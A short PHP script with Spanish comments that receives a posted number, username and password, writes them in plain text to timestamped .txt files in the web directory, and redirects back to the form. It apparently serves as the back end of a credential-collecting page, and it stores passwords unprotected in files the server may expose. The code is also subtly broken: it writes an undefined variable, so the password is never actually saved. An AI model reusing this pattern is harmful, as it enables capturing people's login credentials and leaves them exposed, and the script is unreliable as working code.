<?php
// Verifica si se ha enviado el formulario
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtiene los datos del formulario
    $numero = $_POST["numero"] ?? "";
    $usuario = $_POST["usuario"] ?? "";
    $contra = $_POST["contra"] ?? "";

    $archivo_nombre = 'datos_' . date('Ymd_His') . '.txt'; // Formato: datos_YYYYMMDD_HHMMSS.txt

    // Guardar los datos en un nuevo archivo
    $archivo = fopen($archivo_nombre, "w"); // "w" crea un nuevo archivo (o sobrescribe uno existente)
    fwrite($archivo, "Número: " . $numero . "\n");
    fwrite($archivo, "Usuario: " . $usuario . "\n");
    fwrite($archivo, "Contraseña: " . $contraseña . "\n");
    fclose($archivo);

    // Redirige de vuelta al formulario
    header("Location: form.php?enviado=true");
    exit();
}
?>
